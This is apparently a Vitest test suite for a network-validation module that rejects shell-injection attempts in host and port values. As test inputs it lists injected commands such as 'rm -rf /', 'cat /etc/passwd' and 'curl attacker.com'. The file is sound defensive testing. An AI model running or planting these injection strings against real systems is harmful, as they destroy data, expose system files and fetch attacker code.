import { describe, it, expect } from 'vitest';
import { 
  validateHost, 
  validatePort, 
  validateHostPort, 
  escapeShellArg,
  NetworkValidationError 
} from '../network-validation.js';

describe('network-validation', function networkValidationTests() {
  describe('#validateHost', function validateHostTests() {
    it('should accept valid hostnames', function validHostnames() {
      expect(validateHost('localhost')).toBe('localhost');
      expect(validateHost('example.com')).toBe('example.com');
      expect(validateHost('sub.example.com')).toBe('sub.example.com');
      expect(validateHost('test-host')).toBe('test-host');
      expect(validateHost('host123')).toBe('host123');
      expect(validateHost('a.b.c.d.e')).toBe('a.b.c.d.e');
    });

    it('should accept valid IP addresses', function validIpAddresses() {
      expect(validateHost('127.0.0.1')).toBe('127.0.0.1');
      expect(validateHost('192.168.1.1')).toBe('192.168.1.1');
      expect(validateHost('10.0.0.1')).toBe('10.0.0.1');
      expect(validateHost('::1')).toBe('::1');
      expect(validateHost('2001:db8::1')).toBe('2001:db8::1');
    });

    it('should trim whitespace from valid hosts', function trimWhitespace() {
      expect(validateHost('  localhost  ')).toBe('localhost');
      expect(validateHost('\tlocalhost\n')).toBe('localhost');
    });

    it('should reject empty or whitespace-only hosts', function rejectEmpty() {
      expect(() => validateHost('')).toThrow(/empty/);
      expect(() => validateHost('   ')).toThrow(/empty/);
      expect(() => validateHost('\t\n')).toThrow(/empty/);
    });

    it('should reject non-string inputs', function rejectNonString() {
      expect(() => validateHost(123 as any)).toThrow(/must be a string/);
      expect(() => validateHost(null as any)).toThrow(/must be a string/);
      expect(() => validateHost(undefined as any)).toThrow(/must be a string/);
    });

    it('should reject hosts that are too long', function rejectTooLong() {
      const longHost = 'a'.repeat(254);
      expect(() => validateHost(longHost)).toThrow(/maximum length/);
    });

    it('should reject hosts with dangerous characters', function rejectDangerous() {
      const dangerousChars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', "'", '"', '\\'];
      
      for (const char of dangerousChars) {
        const hostWithDanger = `host${char}test`;
        expect(() => validateHost(hostWithDanger)).toThrow(/dangerous characters/);
      }
    });

    it('should reject hosts with control characters', function rejectControl() {
      expect(() => validateHost('host\x00test')).toThrow(/control characters/);
      expect(() => validateHost('host\x01test')).toThrow(/control characters/);
      expect(() => validateHost('host\x7ftest')).toThrow(/control characters/);
    });

    it('should reject command substitution attempts', function rejectCommandSubstitution() {
      expect(() => validateHost('host$(id)')).toThrow(/dangerous characters/);
      expect(() => validateHost('host`id`')).toThrow(/dangerous characters/);
      expect(() => validateHost('$(whoami).com')).toThrow(/dangerous characters/);
    });

    it('should reject invalid hostname formats', function rejectInvalidFormat() {
      expect(() => validateHost('host..com')).toThrow(/Invalid hostname format/);
      expect(() => validateHost('-host.com')).toThrow(/Invalid hostname format/);
      expect(() => validateHost('host.com-')).toThrow(/Invalid hostname format/);
      expect(() => validateHost('host..test')).toThrow(/Invalid hostname format/);
    });

    it('should reject command injection attempts', function rejectCommandInjection() {
      const injectionAttempts = [
        'host; rm -rf /',
        'host && evil-command',
        'host || evil-command',
        'host | evil-command',
        'host; evil-command',
        'host`evil-command`',
        'host$(evil-command)'
      ];

      for (const attempt of injectionAttempts) {
        expect(() => validateHost(attempt)).toThrow(NetworkValidationError);
      }
    });
  });

  describe('#validatePort', function validatePortTests() {
    it('should accept valid numeric ports', function validNumeric() {
      expect(validatePort(80)).toBe(80);
      expect(validatePort(443)).toBe(443);
      expect(validatePort(8080)).toBe(8080);
      expect(validatePort(65535)).toBe(65535);
      expect(validatePort(1)).toBe(1);
    });

    it('should accept valid string ports', function validString() {
      expect(validatePort('80')).toBe(80);
      expect(validatePort('443')).toBe(443);
      expect(validatePort('8080')).toBe(8080);
      expect(validatePort(' 3000 ')).toBe(3000);
    });

    it('should reject empty string ports', function rejectEmpty() {
      expect(() => validatePort('')).toThrow(/empty/);
      expect(() => validatePort('   ')).toThrow(/empty/);
    });

    it('should reject non-integer types', function rejectNonInteger() {
      expect(() => validatePort(80.5)).toThrow(/integer/);
      expect(() => validatePort(NaN)).toThrow(/integer/);
      expect(() => validatePort(Infinity)).toThrow(/integer/);
    });

    it('should reject invalid port ranges', function rejectInvalidRange() {
      expect(() => validatePort(0)).toThrow(/between 1 and 65535/);
      expect(() => validatePort(-1)).toThrow(/between 1 and 65535/);
      expect(() => validatePort(65536)).toThrow(/between 1 and 65535/);
      expect(() => validatePort(70000)).toThrow(/between 1 and 65535/);
    });

    it('should reject string ports with dangerous characters', function rejectDangerousInString() {
      const dangerousChars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', "'", '"', '\\'];
      
      for (const char of dangerousChars) {
        const portWithDanger = `80${char}`;
        expect(() => validatePort(portWithDanger)).toThrow(/dangerous characters/);
      }
    });

    it('should reject string ports with control characters', function rejectControlInString() {
      expect(() => validatePort('80\x00')).toThrow(/control characters/);
      expect(() => validatePort('80\x01')).toThrow(/control characters/);
    });

    it('should reject non-digit string ports', function rejectNonDigit() {
      expect(() => validatePort('80a')).toThrow(/only digits/);
      expect(() => validatePort('abc')).toThrow(/only digits/);
      expect(() => validatePort('80.5')).toThrow(/only digits/);
      expect(() => validatePort('80-443')).toThrow(/only digits/);
    });

    it('should reject command injection in port strings', function rejectPortInjection() {
      const injectionAttempts = [
        '80; rm -rf /',
        '80 && evil',
        '80`evil`',
        '80$(evil)'
      ];

      for (const attempt of injectionAttempts) {
        expect(() => validatePort(attempt)).toThrow(NetworkValidationError);
      }
    });

    it('should reject non-string non-number inputs', function rejectInvalidTypes() {
      expect(() => validatePort(null as any)).toThrow(/string or number/);
      expect(() => validatePort(undefined as any)).toThrow(/string or number/);
      expect(() => validatePort({} as any)).toThrow(/string or number/);
      expect(() => validatePort([] as any)).toThrow(/string or number/);
    });
  });

  describe('#validateHostPort', function validateHostPortTests() {
    it('should validate valid host-port combinations', function validCombinations() {
      expect(validateHostPort('localhost', 8080)).toEqual(['localhost', 8080]);
      expect(validateHostPort('127.0.0.1', '443')).toEqual(['127.0.0.1', 443]);
      expect(validateHostPort('example.com', 80)).toEqual(['example.com', 80]);
    });

    it('should fail if either host or port is invalid', function failEither() {
      expect(() => validateHostPort('invalid;host', 8080)).toThrow(NetworkValidationError);
      expect(() => validateHostPort('localhost', 70000)).toThrow(NetworkValidationError);
      expect(() => validateHostPort('host`cmd`', '80;rm')).toThrow(NetworkValidationError);
    });
  });

  describe('#escapeShellArg', function escapeShellArgTests() {
    it('should wrap simple arguments in single quotes', function wrapSimple() {
      expect(escapeShellArg('localhost')).toBe("'localhost'");
      expect(escapeShellArg('127.0.0.1')).toBe("'127.0.0.1'");
      expect(escapeShellArg('8080')).toBe("'8080'");
    });

    it('should escape single quotes in arguments', function escapeSingleQuotes() {
      expect(escapeShellArg("host'name")).toBe("'host'\\''name'");
      expect(escapeShellArg("host'test'name")).toBe("'host'\\''test'\\''name'");
    });

    it('should handle arguments with dangerous characters safely', function handleDangerous() {
      expect(escapeShellArg('host; rm -rf /')).toBe("'host; rm -rf /'");
      expect(escapeShellArg('host$(evil)')).toBe("'host$(evil)'");
      expect(escapeShellArg('host`evil`')).toBe("'host`evil`'");
      expect(escapeShellArg('host && evil')).toBe("'host && evil'");
    });

    it('should handle empty and whitespace arguments', function handleEmpty() {
      expect(escapeShellArg('')).toBe("''");
      expect(escapeShellArg('  ')).toBe("'  '");
      expect(escapeShellArg('\t\n')).toBe("'\t\n'");
    });

    it('should reject non-string inputs', function rejectNonString() {
      expect(() => escapeShellArg(123 as any)).toThrow(/must be a string/);
      expect(() => escapeShellArg(null as any)).toThrow(/must be a string/);
    });
  });

  describe('#NetworkValidationError', function networkValidationErrorTests() {
    it('should create error with parameter and value info', function createWithInfo() {
      const error = new NetworkValidationError('Test message', 'host', 'badvalue');
      
      expect(error.name).toBe('NetworkValidationError');
      expect(error.message).toBe('Test message');
      expect(error.parameter).toBe('host');
      expect(error.value).toBe('badvalue');
      expect(error instanceof Error).toBe(true);
      expect(error instanceof NetworkValidationError).toBe(true);
    });
  });

  describe('integration with real-world attack patterns', function integrationTests() {
    it('should prevent common command injection patterns', function preventCommonInjection() {
      const attackPatterns = [
        // Command chaining
        { host: 'host; rm -rf /', port: 80 },
        { host: 'host && whoami', port: 80 },
        { host: 'host || id', port: 80 },
        { host: 'host | cat /etc/passwd', port: 80 },
        
        // Command substitution
        { host: 'host$(curl attacker.com)', port: 80 },
        { host: 'host`wget malware`', port: 80 },
        
        // Port injection
        { host: 'localhost', port: '80; curl attacker.com' as any },
        { host: 'localhost', port: '80`evil`' as any },
        
        // Null byte injection
        { host: 'host\x00evil', port: 80 },
        { host: 'localhost', port: '80\x00evil' as any },
        
        // Quote breaking
        { host: "host'$(evil)'", port: 80 },
        { host: 'host"$(evil)"', port: 80 }
      ];

      for (const pattern of attackPatterns) {
        expect(() => validateHostPort(pattern.host, pattern.port)).toThrow();
      }
    });

    it('should allow legitimate network configurations', function allowLegitimate() {
      const legitimateConfigs = [
        { host: 'localhost', port: 8080 },
        { host: '127.0.0.1', port: 3000 },
        { host: 'api.example.com', port: 443 },
        { host: 'test-server.local', port: '9000' },
        { host: 'db-primary.internal', port: 5432 },
        { host: '::1', port: 8000 },
        { host: '2001:db8::1', port: 80 }
      ];

      for (const config of legitimateConfigs) {
        expect(() => validateHostPort(config.host, config.port)).not.toThrow();
        const [validHost, validPort] = validateHostPort(config.host, config.port);
        expect(typeof validHost).toBe('string');
        expect(typeof validPort).toBe('number');
        expect(validPort).toBeGreaterThanOrEqual(1);
        expect(validPort).toBeLessThanOrEqual(65535);
      }
    });
  });

  describe('ReDoS protection', function redosProtection() {
    it('should handle long hostname inputs efficiently', function handleLongInputs() {
      // Test with extremely long hostname that could cause ReDoS with vulnerable regex
      const longHostname = 'a'.repeat(1000) + '.com';
      const start = Date.now();
      
      expect(() => validateHost(longHostname)).toThrow(/maximum length/);
      
      const duration = Date.now() - start;
      // Should complete quickly (under 100ms) even with long input
      expect(duration).toBeLessThan(100);
    });

    it('should handle nested patterns efficiently', function handleNestedPatterns() {
      // Test patterns that could cause catastrophic backtracking
      const problematicPatterns = [
        'a-'.repeat(100) + 'a.com',
        'a'.repeat(64) + '.com', // Label too long
        'a'.repeat(100) + '-' + 'b'.repeat(100) + '.com',
        '.'.repeat(100),
        '-'.repeat(100)
      ];

      for (const pattern of problematicPatterns) {
        const start = Date.now();
        expect(() => validateHost(pattern)).toThrow();
        const duration = Date.now() - start;
        expect(duration).toBeLessThan(50); // Should be very fast
      }
    });

    it('should validate complex but legitimate hostnames efficiently', function validateComplex() {
      const complexHostnames = [
        'sub1.sub2.sub3.sub4.sub5.example.com',
        'a'.repeat(63) + '.' + 'b'.repeat(63) + '.com',
        'test-server-001.internal.company.local',
        'api-v2.staging.us-west-2.example.org'
      ];

      for (const hostname of complexHostnames) {
        const start = Date.now();
        expect(() => validateHost(hostname)).not.toThrow();
        const duration = Date.now() - start;
        expect(duration).toBeLessThan(10); // Should be very fast for valid hostnames
      }
    });
  });
});
